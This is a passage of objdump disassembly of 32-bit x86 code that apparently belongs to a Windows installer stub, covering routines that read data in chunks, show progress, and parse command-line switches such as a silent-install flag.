  4032a9:	6a ff                	push   $0xffffffff
  4032ab:	e8 64 00 00 00       	call   0x403314
  4032b0:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4032b3:	74 11                	je     0x4032c6
  4032b5:	b8 50 a0 40 00       	mov    $0x40a050,%eax
  4032ba:	eb 51                	jmp    0x40330d
  4032bc:	6a 01                	push   $0x1
  4032be:	e8 82 fd ff ff       	call   0x403045
  4032c3:	59                   	pop    %ecx
  4032c4:	eb ef                	jmp    0x4032b5
  4032c6:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  4032ca:	89 35 30 9a 42 00    	mov    %esi,0x429a30
  4032d0:	8b 06                	mov    (%esi),%eax
  4032d2:	a3 38 9a 42 00       	mov    %eax,0x429a38
  4032d7:	74 06                	je     0x4032df
  4032d9:	ff 05 3c 9a 42 00    	incl   0x429a3c
  4032df:	6a 08                	push   $0x8
  4032e1:	8d 46 44             	lea    0x44(%esi),%eax
  4032e4:	59                   	pop    %ecx
  4032e5:	83 e8 08             	sub    $0x8,%eax
  4032e8:	01 30                	add    %esi,(%eax)
  4032ea:	49                   	dec    %ecx
  4032eb:	75 f8                	jne    0x4032e5
  4032ed:	6a 01                	push   $0x1
  4032ef:	57                   	push   %edi
  4032f0:	57                   	push   %edi
  4032f1:	53                   	push   %ebx
  4032f2:	ff 15 34 81 40 00    	call   *0x408134
  4032f8:	89 46 3c             	mov    %eax,0x3c(%esi)
  4032fb:	83 c6 04             	add    $0x4,%esi
  4032fe:	6a 40                	push   $0x40
  403300:	56                   	push   %esi
  403301:	68 40 9a 42 00       	push   $0x429a40
  403306:	e8 29 2d 00 00       	call   0x406034
  40330b:	33 c0                	xor    %eax,%eax
  40330d:	5f                   	pop    %edi
  40330e:	5e                   	pop    %esi
  40330f:	5b                   	pop    %ebx
  403310:	c9                   	leave
  403311:	c2 04 00             	ret    $0x4
  403314:	55                   	push   %ebp
  403315:	8b ec                	mov    %esp,%ebp
  403317:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40331d:	53                   	push   %ebx
  40331e:	56                   	push   %esi
  40331f:	8b 75 14             	mov    0x14(%ebp),%esi
  403322:	57                   	push   %edi
  403323:	8b 7d 10             	mov    0x10(%ebp),%edi
  403326:	89 75 f8             	mov    %esi,-0x8(%ebp)
  403329:	85 ff                	test   %edi,%edi
  40332b:	75 07                	jne    0x403334
  40332d:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  403334:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403338:	8b df                	mov    %edi,%ebx
  40333a:	85 ff                	test   %edi,%edi
  40333c:	75 05                	jne    0x403343
  40333e:	bb c0 8e 41 00       	mov    $0x418ec0,%ebx
  403343:	8b 45 08             	mov    0x8(%ebp),%eax
  403346:	85 c0                	test   %eax,%eax
  403348:	7c 0e                	jl     0x403358
  40334a:	8b 0d 78 9a 42 00    	mov    0x429a78,%ecx
  403350:	03 c8                	add    %eax,%ecx
  403352:	51                   	push   %ecx
  403353:	e8 b7 01 00 00       	call   0x40350f
  403358:	8d 45 14             	lea    0x14(%ebp),%eax
  40335b:	6a 04                	push   $0x4
  40335d:	50                   	push   %eax
  40335e:	e8 96 01 00 00       	call   0x4034f9
  403363:	85 c0                	test   %eax,%eax
  403365:	0f 84 45 01 00 00    	je     0x4034b0
  40336b:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  40336f:	0f 84 24 01 00 00    	je     0x403499
  403375:	ff 15 d0 80 40 00    	call   *0x4080d0
  40337b:	b9 30 ce 40 00       	mov    $0x40ce30,%ecx
  403380:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403383:	e8 50 37 00 00       	call   0x406ad8
  403388:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  40338f:	8b 45 14             	mov    0x14(%ebp),%eax
  403392:	89 45 08             	mov    %eax,0x8(%ebp)
  403395:	0f 8e 54 01 00 00    	jle    0x4034ef
  40339b:	be 00 40 00 00       	mov    $0x4000,%esi
  4033a0:	39 75 14             	cmp    %esi,0x14(%ebp)
  4033a3:	7d 03                	jge    0x4033a8
  4033a5:	8b 75 14             	mov    0x14(%ebp),%esi
  4033a8:	bf c0 4e 41 00       	mov    $0x414ec0,%edi
  4033ad:	56                   	push   %esi
  4033ae:	57                   	push   %edi
  4033af:	e8 45 01 00 00       	call   0x4034f9
  4033b4:	85 c0                	test   %eax,%eax
  4033b6:	0f 84 f4 00 00 00    	je     0x4034b0
  4033bc:	29 75 14             	sub    %esi,0x14(%ebp)
  4033bf:	89 3d 48 ce 40 00    	mov    %edi,0x40ce48
  4033c5:	89 35 4c ce 40 00    	mov    %esi,0x40ce4c
  4033cb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4033ce:	b9 30 ce 40 00       	mov    $0x40ce30,%ecx
  4033d3:	89 1d 50 ce 40 00    	mov    %ebx,0x40ce50
  4033d9:	a3 54 ce 40 00       	mov    %eax,0x40ce54
  4033de:	e8 15 37 00 00       	call   0x406af8
  4033e3:	85 c0                	test   %eax,%eax
  4033e5:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4033e8:	0f 8c a3 00 00 00    	jl     0x403491
  4033ee:	8b 35 50 ce 40 00    	mov    0x40ce50,%esi
  4033f4:	2b f3                	sub    %ebx,%esi
  4033f6:	ff 15 d0 80 40 00    	call   *0x4080d0
  4033fc:	f6 05 d4 9a 42 00 01 	testb  $0x1,0x429ad4
  403403:	8b f8                	mov    %eax,%edi
  403405:	74 49                	je     0x403450
  403407:	2b 45 f4             	sub    -0xc(%ebp),%eax
  40340a:	3d c8 00 00 00       	cmp    $0xc8,%eax
  40340f:	77 06                	ja     0x403417
  403411:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403415:	75 39                	jne    0x403450
  403417:	8b 45 08             	mov    0x8(%ebp),%eax
  40341a:	ff 75 08             	push   0x8(%ebp)
  40341d:	2b 45 14             	sub    0x14(%ebp),%eax
  403420:	6a 64                	push   $0x64
  403422:	50                   	push   %eax
  403423:	ff 15 48 81 40 00    	call   *0x408148
  403429:	50                   	push   %eax
  40342a:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  403430:	68 1c a2 40 00       	push   $0x40a21c
  403435:	50                   	push   %eax
  403436:	ff 15 2c 82 40 00    	call   *0x40822c
  40343c:	83 c4 0c             	add    $0xc,%esp
  40343f:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  403445:	50                   	push   %eax
  403446:	6a 00                	push   $0x0
  403448:	e8 c1 21 00 00       	call   0x40560e
  40344d:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403450:	85 f6                	test   %esi,%esi
  403452:	74 31                	je     0x403485
  403454:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403458:	75 13                	jne    0x40346d
  40345a:	56                   	push   %esi
  40345b:	53                   	push   %ebx
  40345c:	ff 75 0c             	push   0xc(%ebp)
  40345f:	e8 c7 2c 00 00       	call   0x40612b
  403464:	85 c0                	test   %eax,%eax
  403466:	74 2d                	je     0x403495
  403468:	01 75 fc             	add    %esi,-0x4(%ebp)
  40346b:	eb 0c                	jmp    0x403479
  40346d:	01 75 fc             	add    %esi,-0x4(%ebp)
  403470:	29 75 f8             	sub    %esi,-0x8(%ebp)
  403473:	8b 1d 50 ce 40 00    	mov    0x40ce50,%ebx
  403479:	83 7d f0 01          	cmpl   $0x1,-0x10(%ebp)
  40347d:	0f 85 48 ff ff ff    	jne    0x4033cb
  403483:	eb 6a                	jmp    0x4034ef
  403485:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403489:	0f 8f 0c ff ff ff    	jg     0x40339b
  40348f:	eb 5e                	jmp    0x4034ef
  403491:	6a fc                	push   $0xfffffffc
  403493:	eb 1d                	jmp    0x4034b2
  403495:	6a fe                	push   $0xfffffffe
  403497:	eb 19                	jmp    0x4034b2
  403499:	85 ff                	test   %edi,%edi
  40349b:	74 47                	je     0x4034e4
  40349d:	39 75 14             	cmp    %esi,0x14(%ebp)
  4034a0:	7d 03                	jge    0x4034a5
  4034a2:	8b 75 14             	mov    0x14(%ebp),%esi
  4034a5:	56                   	push   %esi
  4034a6:	57                   	push   %edi
  4034a7:	e8 4d 00 00 00       	call   0x4034f9
  4034ac:	85 c0                	test   %eax,%eax
  4034ae:	75 3c                	jne    0x4034ec
  4034b0:	6a fd                	push   $0xfffffffd
  4034b2:	58                   	pop    %eax
  4034b3:	eb 3d                	jmp    0x4034f2
  4034b5:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4034b8:	39 75 14             	cmp    %esi,0x14(%ebp)
  4034bb:	7d 03                	jge    0x4034c0
  4034bd:	8b 75 14             	mov    0x14(%ebp),%esi
  4034c0:	bf c0 4e 41 00       	mov    $0x414ec0,%edi
  4034c5:	56                   	push   %esi
  4034c6:	57                   	push   %edi
  4034c7:	e8 2d 00 00 00       	call   0x4034f9
  4034cc:	85 c0                	test   %eax,%eax
  4034ce:	74 e0                	je     0x4034b0
  4034d0:	56                   	push   %esi
  4034d1:	57                   	push   %edi
  4034d2:	ff 75 0c             	push   0xc(%ebp)
  4034d5:	e8 51 2c 00 00       	call   0x40612b
  4034da:	85 c0                	test   %eax,%eax
  4034dc:	74 b7                	je     0x403495
  4034de:	01 75 fc             	add    %esi,-0x4(%ebp)
  4034e1:	29 75 14             	sub    %esi,0x14(%ebp)
  4034e4:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4034e8:	7f cb                	jg     0x4034b5
  4034ea:	eb 03                	jmp    0x4034ef
  4034ec:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4034ef:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4034f2:	5f                   	pop    %edi
  4034f3:	5e                   	pop    %esi
  4034f4:	5b                   	pop    %ebx
  4034f5:	c9                   	leave
  4034f6:	c2 10 00             	ret    $0x10
  4034f9:	ff 74 24 08          	push   0x8(%esp)
  4034fd:	ff 74 24 08          	push   0x8(%esp)
  403501:	ff 35 18 a0 40 00    	push   0x40a018
  403507:	e8 f0 2b 00 00       	call   0x4060fc
  40350c:	c2 08 00             	ret    $0x8
  40350f:	6a 00                	push   $0x0
  403511:	6a 00                	push   $0x0
  403513:	ff 74 24 0c          	push   0xc(%esp)
  403517:	ff 35 18 a0 40 00    	push   0x40a018
  40351d:	ff 15 34 81 40 00    	call   *0x408134
  403523:	c2 04 00             	ret    $0x4
  403526:	56                   	push   %esi
  403527:	be 00 68 43 00       	mov    $0x436800,%esi
  40352c:	56                   	push   %esi
  40352d:	e8 05 33 00 00       	call   0x406837
  403532:	56                   	push   %esi
  403533:	e8 97 29 00 00       	call   0x405ecf
  403538:	85 c0                	test   %eax,%eax
  40353a:	75 02                	jne    0x40353e
  40353c:	5e                   	pop    %esi
  40353d:	c3                   	ret
  40353e:	56                   	push   %esi
  40353f:	e8 14 29 00 00       	call   0x405e58
  403544:	56                   	push   %esi
  403545:	e8 ed 25 00 00       	call   0x405b37
  40354a:	56                   	push   %esi
  40354b:	68 00 60 43 00       	push   $0x436000
  403550:	e8 53 2b 00 00       	call   0x4060a8
  403555:	5e                   	pop    %esi
  403556:	c3                   	ret
  403557:	81 ec f8 03 00 00    	sub    $0x3f8,%esp
  40355d:	55                   	push   %ebp
  40355e:	56                   	push   %esi
  40355f:	57                   	push   %edi
  403560:	6a 20                	push   $0x20
  403562:	5f                   	pop    %edi
  403563:	33 ed                	xor    %ebp,%ebp
  403565:	68 01 80 00 00       	push   $0x8001
  40356a:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  40356e:	c7 44 24 18 d8 a2 40 	movl   $0x40a2d8,0x18(%esp)
  403575:	00 
  403576:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  40357a:	ff 15 a0 80 40 00    	call   *0x4080a0
  403580:	8b 35 a4 80 40 00    	mov    0x4080a4,%esi
  403586:	8d 44 24 34          	lea    0x34(%esp),%eax
  40358a:	50                   	push   %eax
  40358b:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  40358f:	89 ac 24 4c 01 00 00 	mov    %ebp,0x14c(%esp)
  403596:	89 ac 24 50 01 00 00 	mov    %ebp,0x150(%esp)
  40359d:	c7 44 24 38 1c 01 00 	movl   $0x11c,0x38(%esp)
  4035a4:	00 
  4035a5:	ff d6                	call   *%esi
  4035a7:	85 c0                	test   %eax,%eax
  4035a9:	75 38                	jne    0x4035e3
  4035ab:	8d 44 24 34          	lea    0x34(%esp),%eax
  4035af:	c7 44 24 34 14 01 00 	movl   $0x114,0x34(%esp)
  4035b6:	00 
  4035b7:	50                   	push   %eax
  4035b8:	ff d6                	call   *%esi
  4035ba:	66 8b 44 24 48       	mov    0x48(%esp),%ax
  4035bf:	8b 4c 24 62          	mov    0x62(%esp),%ecx
  4035c3:	66 2d 53 00          	sub    $0x53,%ax
  4035c7:	83 c1 d0             	add    $0xffffffd0,%ecx
  4035ca:	66 f7 d8             	neg    %ax
  4035cd:	1b c0                	sbb    %eax,%eax
  4035cf:	c6 84 24 4e 01 00 00 	movb   $0x4,0x14e(%esp)
  4035d6:	04 
  4035d7:	f7 d0                	not    %eax
  4035d9:	23 c1                	and    %ecx,%eax
  4035db:	66 89 84 24 48 01 00 	mov    %ax,0x148(%esp)
  4035e2:	00 
  4035e3:	83 7c 24 38 0a       	cmpl   $0xa,0x38(%esp)
  4035e8:	73 06                	jae    0x4035f0
  4035ea:	66 83 64 24 42 00    	andw   $0x0,0x42(%esp)
  4035f0:	8b 44 24 40          	mov    0x40(%esp),%eax
  4035f4:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  4035f9:	a3 d8 9a 42 00       	mov    %eax,0x429ad8
  4035fe:	33 c0                	xor    %eax,%eax
  403600:	8a 64 24 38          	mov    0x38(%esp),%ah
  403604:	0f b7 c0             	movzwl %ax,%eax
  403607:	0b c1                	or     %ecx,%eax
  403609:	33 c9                	xor    %ecx,%ecx
  40360b:	8a ac 24 48 01 00 00 	mov    0x148(%esp),%ch
  403612:	0f b7 c9             	movzwl %cx,%ecx
  403615:	c1 e0 10             	shl    $0x10,%eax
  403618:	0b c1                	or     %ecx,%eax
  40361a:	0f b6 8c 24 4e 01 00 	movzbl 0x14e(%esp),%ecx
  403621:	00 
  403622:	0b c1                	or     %ecx,%eax
  403624:	a3 dc 9a 42 00       	mov    %eax,0x429adc
  403629:	66 81 3d de 9a 42 00 	cmpw   $0x600,0x429ade
  403630:	00 06 
  403632:	74 11                	je     0x403645
  403634:	55                   	push   %ebp
  403635:	e8 43 33 00 00       	call   0x40697d
  40363a:	3b c5                	cmp    %ebp,%eax
  40363c:	74 07                	je     0x403645
  40363e:	68 00 0c 00 00       	push   $0xc00
  403643:	ff d0                	call   *%eax
  403645:	be a8 82 40 00       	mov    $0x4082a8,%esi
  40364a:	56                   	push   %esi
  40364b:	e8 bd 32 00 00       	call   0x40690d
  403650:	56                   	push   %esi
  403651:	ff 15 28 81 40 00    	call   *0x408128
  403657:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  40365b:	80 3e 00             	cmpb   $0x0,(%esi)
  40365e:	75 ea                	jne    0x40364a
  403660:	6a 0c                	push   $0xc
  403662:	e8 16 33 00 00       	call   0x40697d
  403667:	6a 0a                	push   $0xa
  403669:	e8 0f 33 00 00       	call   0x40697d
  40366e:	6a 08                	push   $0x8
  403670:	a3 24 9a 42 00       	mov    %eax,0x429a24
  403675:	e8 03 33 00 00       	call   0x40697d
  40367a:	3b c5                	cmp    %ebp,%eax
  40367c:	74 0f                	je     0x40368d
  40367e:	6a 1e                	push   $0x1e
  403680:	ff d0                	call   *%eax
  403682:	85 c0                	test   %eax,%eax
  403684:	74 07                	je     0x40368d
  403686:	80 0d dc 9a 42 00 80 	orb    $0x80,0x429adc
  40368d:	53                   	push   %ebx
  40368e:	ff 15 38 80 40 00    	call   *0x408038
  403694:	55                   	push   %ebp
  403695:	ff 15 98 82 40 00    	call   *0x408298
  40369b:	a3 e0 9a 42 00       	mov    %eax,0x429ae0
  4036a0:	55                   	push   %ebp
  4036a1:	8d 84 24 58 01 00 00 	lea    0x158(%esp),%eax
  4036a8:	68 b4 02 00 00       	push   $0x2b4
  4036ad:	50                   	push   %eax
  4036ae:	55                   	push   %ebp
  4036af:	68 c8 0e 42 00       	push   $0x420ec8
  4036b4:	ff 15 7c 81 40 00    	call   *0x40817c
  4036ba:	68 bc a2 40 00       	push   $0x40a2bc
  4036bf:	68 20 8a 42 00       	push   $0x428a20
  4036c4:	e8 c0 2e 00 00       	call   0x406589
  4036c9:	ff 15 a8 80 40 00    	call   *0x4080a8
  4036cf:	bb 00 40 43 00       	mov    $0x434000,%ebx
  4036d4:	50                   	push   %eax
  4036d5:	53                   	push   %ebx
  4036d6:	e8 ae 2e 00 00       	call   0x406589
  4036db:	6a 22                	push   $0x22
  4036dd:	c7 05 20 9a 42 00 00 	movl   $0x400000,0x429a20
  4036e4:	00 40 00 
  4036e7:	5e                   	pop    %esi
  4036e8:	8b c3                	mov    %ebx,%eax
  4036ea:	66 39 35 00 40 43 00 	cmp    %si,0x434000
  4036f1:	75 07                	jne    0x4036fa
  4036f3:	8b fe                	mov    %esi,%edi
  4036f5:	b8 02 40 43 00       	mov    $0x434002,%eax
  4036fa:	57                   	push   %edi
  4036fb:	50                   	push   %eax
  4036fc:	e8 84 27 00 00       	call   0x405e85
  403701:	50                   	push   %eax
  403702:	ff 15 08 82 40 00    	call   *0x408208
  403708:	8b c8                	mov    %eax,%ecx
  40370a:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  40370e:	e9 f6 00 00 00       	jmp    0x403809
  403713:	6a 20                	push   $0x20
  403715:	5a                   	pop    %edx
  403716:	66 3b c2             	cmp    %dx,%ax
  403719:	75 07                	jne    0x403722
  40371b:	41                   	inc    %ecx
  40371c:	41                   	inc    %ecx
  40371d:	66 39 11             	cmp    %dx,(%ecx)
  403720:	74 f9                	je     0x40371b
  403722:	66 39 31             	cmp    %si,(%ecx)
  403725:	89 54 24 10          	mov    %edx,0x10(%esp)
  403729:	75 06                	jne    0x403731
  40372b:	41                   	inc    %ecx
  40372c:	89 74 24 10          	mov    %esi,0x10(%esp)
  403730:	41                   	inc    %ecx
  403731:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  403735:	0f 85 bb 00 00 00    	jne    0x4037f6
  40373b:	41                   	inc    %ecx
  40373c:	41                   	inc    %ecx
  40373d:	66 83 39 53          	cmpw   $0x53,(%ecx)
  403741:	75 18                	jne    0x40375b
  403743:	66 8b 41 02          	mov    0x2(%ecx),%ax
  403747:	66 3b c2             	cmp    %dx,%ax
  40374a:	74 05                	je     0x403751
  40374c:	66 3b c5             	cmp    %bp,%ax
  40374f:	75 0a                	jne    0x40375b
  403751:	c7 05 c0 9a 42 00 01 	movl   $0x1,0x429ac0
  403758:	00 00 00 
  40375b:	0f b7 05 b6 a2 40 00 	movzwl 0x40a2b6,%eax
  403762:	99                   	cltd
  403763:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403767:	c1 e0 10             	shl    $0x10,%eax
  40376a:	8b f8                	mov    %eax,%edi
  40376c:	33 f6                	xor    %esi,%esi
  40376e:	0f b7 05 b4 a2 40 00 	movzwl 0x40a2b4,%eax
  403775:	99                   	cltd
  403776:	0f b7 15 b0 a2 40 00 	movzwl 0x40a2b0,%edx
  40377d:	0b f8                	or     %eax,%edi
  40377f:	0f b7 05 b2 a2 40 00 	movzwl 0x40a2b2,%eax
  403786:	c1 e0 10             	shl    $0x10,%eax
  403789:	0b c2                	or     %edx,%eax
  40378b:	99                   	cltd
  40378c:	0b f0                	or     %eax,%esi
  40378e:	8b 01                	mov    (%ecx),%eax
  403790:	0b fa                	or     %edx,%edi
  403792:	3b c6                	cmp    %esi,%eax
  403794:	75 1b                	jne    0x4037b1
  403796:	8b 41 04             	mov    0x4(%ecx),%eax
  403799:	3b c7                	cmp    %edi,%eax
  40379b:	75 14                	jne    0x4037b1
  40379d:	66 8b 41 08          	mov    0x8(%ecx),%ax
  4037a1:	66 3d 20 00          	cmp    $0x20,%ax
  4037a5:	74 05                	je     0x4037ac
  4037a7:	66 3b c5             	cmp    %bp,%ax
  4037aa:	75 05                	jne    0x4037b1
  4037ac:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  4037b1:	0f b7 05 aa a2 40 00 	movzwl 0x40a2aa,%eax
  4037b8:	99                   	cltd
  4037b9:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4037bd:	c1 e0 10             	shl    $0x10,%eax
  4037c0:	8b f8                	mov    %eax,%edi
  4037c2:	33 f6                	xor    %esi,%esi
  4037c4:	0f b7 05 a8 a2 40 00 	movzwl 0x40a2a8,%eax
  4037cb:	99                   	cltd
  4037cc:	0f b7 15 a4 a2 40 00 	movzwl 0x40a2a4,%edx
  4037d3:	0b f8                	or     %eax,%edi
  4037d5:	0f b7 05 a6 a2 40 00 	movzwl 0x40a2a6,%eax
  4037dc:	c1 e0 10             	shl    $0x10,%eax
  4037df:	0b c2                	or     %edx,%eax
  4037e1:	99                   	cltd
  4037e2:	0b f0                	or     %eax,%esi
  4037e4:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4037e7:	0b fa                	or     %edx,%edi
  4037e9:	3b c6                	cmp    %esi,%eax
  4037eb:	75 06                	jne    0x4037f3
  4037ed:	8b 01                	mov    (%ecx),%eax
  4037ef:	3b c7                	cmp    %edi,%eax
  4037f1:	74 24                	je     0x403817
  4037f3:	6a 22                	push   $0x22
  4037f5:	5e                   	pop    %esi
  4037f6:	ff 74 24 10          	push   0x10(%esp)
  4037fa:	51                   	push   %ecx
  4037fb:	e8 85 26 00 00       	call   0x405e85
  403800:	8b c8                	mov    %eax,%ecx
  403802:	66 39 31             	cmp    %si,(%ecx)
  403805:	75 02                	jne    0x403809
  403807:	41                   	inc    %ecx
  403808:	41                   	inc    %ecx
  403809:	66 8b 01             	mov    (%ecx),%ax
  40380c:	66 3b c5             	cmp    %bp,%ax
  40380f:	0f 85 fe fe ff ff    	jne    0x403713
  403815:	eb 12                	jmp    0x403829
  403817:	66 89 69 fc          	mov    %bp,-0x4(%ecx)
  40381b:	83 c1 04             	add    $0x4,%ecx
  40381e:	51                   	push   %ecx
  40381f:	68 00 48 43 00       	push   $0x434800
  403824:	e8 60 2d 00 00       	call   0x406589
  403829:	8b 3d ac 80 40 00    	mov    0x4080ac,%edi
  40382f:	be 00 68 43 00       	mov    $0x436800,%esi
  403834:	56                   	push   %esi
  403835:	68 00 04 00 00       	push   $0x400
  40383a:	ff d7                	call   *%edi
  40383c:	e8 e5 fc ff ff       	call   0x403526
  403841:	85 c0                	test   %eax,%eax
  403843:	75 63                	jne    0x4038a8
  403845:	68 fb 03 00 00       	push   $0x3fb
  40384a:	56                   	push   %esi
  40384b:	ff 15 b0 80 40 00    	call   *0x4080b0
  403851:	68 98 a2 40 00       	push   $0x40a298
  403856:	56                   	push   %esi
  403857:	e8 49 2d 00 00       	call   0x4065a5
  40385c:	e8 c5 fc ff ff       	call   0x403526
  403861:	85 c0                	test   %eax,%eax
  403863:	75 43                	jne    0x4038a8
  403865:	e8 ea 22 00 00       	call   0x405b54
  40386a:	85 c0                	test   %eax,%eax
  40386c:	0f 85 3d 02 00 00    	jne    0x403aaf
  403872:	56                   	push   %esi
  403873:	68 fc 03 00 00       	push   $0x3fc
  403878:	ff d7                	call   *%edi
  40387a:	68 90 a2 40 00       	push   $0x40a290
  40387f:	56                   	push   %esi
  403880:	e8 20 2d 00 00       	call   0x4065a5
  403885:	8b 3d b4 80 40 00    	mov    0x4080b4,%edi
  40388b:	56                   	push   %esi
  40388c:	68 84 a2 40 00       	push   $0x40a284
  403891:	ff d7                	call   *%edi
  403893:	56                   	push   %esi
  403894:	68 7c a2 40 00       	push   $0x40a27c
  403899:	ff d7                	call   *%edi
  40389b:	e8 86 fc ff ff       	call   0x403526
  4038a0:	85 c0                	test   %eax,%eax
  4038a2:	0f 84 07 02 00 00    	je     0x403aaf
  4038a8:	68 00 60 43 00       	push   $0x436000
  4038ad:	ff 15 44 81 40 00    	call   *0x408144
  4038b3:	ff 74 24 14          	push   0x14(%esp)
  4038b7:	e8 ed f7 ff ff       	call   0x4030a9
  4038bc:	3b c5                	cmp    %ebp,%eax
  4038be:	89 44 24 18          	mov    %eax,0x18(%esp)
  4038c2:	0f 85 e7 01 00 00    	jne    0x403aaf
  4038c8:	39 2d 3c 9a 42 00    	cmp    %ebp,0x429a3c
  4038ce:	0f 84 93 00 00 00    	je     0x403967
  4038d4:	55                   	push   %ebp
  4038d5:	53                   	push   %ebx
  4038d6:	e8 aa 25 00 00       	call   0x405e85
  4038db:	8b f8                	mov    %eax,%edi
  4038dd:	3b fb                	cmp    %ebx,%edi
  4038df:	72 4c                	jb     0x40392d
  4038e1:	0f b7 05 76 a2 40 00 	movzwl 0x40a276,%eax
  4038e8:	99                   	cltd
  4038e9:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4038ed:	c1 e0 10             	shl    $0x10,%eax
  4038f0:	8b e8                	mov    %eax,%ebp
  4038f2:	0f b7 05 74 a2 40 00 	movzwl 0x40a274,%eax
  4038f9:	0f b7 0d 70 a2 40 00 	movzwl 0x40a270,%ecx
  403900:	99                   	cltd
  403901:	0b e8                	or     %eax,%ebp
  403903:	0f b7 05 72 a2 40 00 	movzwl 0x40a272,%eax
  40390a:	c1 e0 10             	shl    $0x10,%eax
  40390d:	0b c1                	or     %ecx,%eax
  40390f:	33 c9                	xor    %ecx,%ecx
  403911:	99                   	cltd
  403912:	0b c8                	or     %eax,%ecx
  403914:	8b c5                	mov    %ebp,%eax
  403916:	0b c2                	or     %edx,%eax
  403918:	8b 17                	mov    (%edi),%edx
  40391a:	3b d1                	cmp    %ecx,%edx
  40391c:	75 07                	jne    0x403925
  40391e:	8b 57 04             	mov    0x4(%edi),%edx
  403921:	3b d0                	cmp    %eax,%edx
  403923:	74 06                	je     0x40392b
  403925:	4f                   	dec    %edi
  403926:	4f                   	dec    %edi
  403927:	3b fb                	cmp    %ebx,%edi
  403929:	73 ed                	jae    0x403918
  40392b:	33 ed                	xor    %ebp,%ebp
  40392d:	3b fb                	cmp    %ebx,%edi
  40392f:	c7 44 24 18 e8 a1 40 	movl   $0x40a1e8,0x18(%esp)
  403936:	00 
  403937:	72 43                	jb     0x40397c
  403939:	66 89 2f             	mov    %bp,(%edi)
  40393c:	83 c7 08             	add    $0x8,%edi
  40393f:	57                   	push   %edi
  403940:	e8 1b 26 00 00       	call   0x405f60
  403945:	85 c0                	test   %eax,%eax
  403947:	0f 84 62 01 00 00    	je     0x403aaf
  40394d:	57                   	push   %edi
  40394e:	68 00 48 43 00       	push   $0x434800
  403953:	e8 31 2c 00 00       	call   0x406589
  403958:	57                   	push   %edi
  403959:	68 00 50 43 00       	push   $0x435000
  40395e:	e8 26 2c 00 00       	call   0x406589
  403963:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  403967:	83 0d cc 9a 42 00 ff 	orl    $0xffffffff,0x429acc
  40396e:	e8 e8 02 00 00       	call   0x403c5b
  403973:	89 44 24 20          	mov    %eax,0x20(%esp)
  403977:	e9 33 01 00 00       	jmp    0x403aaf
  40397c:	e8 d3 21 00 00       	call   0x405b54
  403981:	56                   	push   %esi
  403982:	89 44 24 28          	mov    %eax,0x28(%esp)
  403986:	e8 14 2c 00 00       	call   0x40659f
  40398b:	ff 74 24 1c          	push   0x1c(%esp)
  40398f:	8b f8                	mov    %eax,%edi
  403991:	68 00 a0 42 00       	push   $0x42a000
  403996:	e8 ee 2b 00 00       	call   0x406589
  40399b:	66 39 2d 00 48 43 00 	cmp    %bp,0x434800
  4039a2:	75 0f                	jne    0x4039b3
  4039a4:	68 00 58 43 00       	push   $0x435800
  4039a9:	68 00 48 43 00       	push   $0x434800
  4039ae:	e8 d6 2b 00 00       	call   0x406589
  4039b3:	8d 04 7d 00 68 43 00 	lea    0x436800(,%edi,2),%eax
  4039ba:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  4039c1:	00 
  4039c2:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4039c6:	bf 00 c8 42 00       	mov    $0x42c800,%edi
  4039cb:	bb 00 d0 42 00       	mov    $0x42d000,%ebx
  4039d0:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4039d4:	0f b7 6c 24 14       	movzwl 0x14(%esp),%ebp
  4039d9:	55                   	push   %ebp
  4039da:	68 58 a2 40 00       	push   $0x40a258
  4039df:	ff 74 24 24          	push   0x24(%esp)
  4039e3:	ff 15 2c 82 40 00    	call   *0x40822c
  4039e9:	a1 30 9a 42 00       	mov    0x429a30,%eax
  4039ee:	83 c4 0c             	add    $0xc,%esp
  4039f1:	ff b0 20 01 00 00    	push   0x120(%eax)
  4039f7:	57                   	push   %edi
  4039f8:	e8 c9 2b 00 00       	call   0x4065c6
  4039fd:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  403a02:	56                   	push   %esi
  403a03:	74 07                	je     0x403a0c
  403a05:	e8 d3 20 00 00       	call   0x405add
  403a0a:	eb 05                	jmp    0x403a11
  403a0c:	e8 26 21 00 00       	call   0x405b37
  403a11:	85 c0                	test   %eax,%eax
  403a13:	74 3a                	je     0x403a4f
  403a15:	57                   	push   %edi
  403a16:	ff 15 dc 80 40 00    	call   *0x4080dc
  403a1c:	f6 c4 04             	test   $0x4,%ah
  403a1f:	75 1f                	jne    0x403a40
  403a21:	57                   	push   %edi
  403a22:	ff 15 44 81 40 00    	call   *0x408144
  403a28:	85 c0                	test   %eax,%eax
  403a2a:	74 14                	je     0x403a40
  403a2c:	6a 01                	push   $0x1
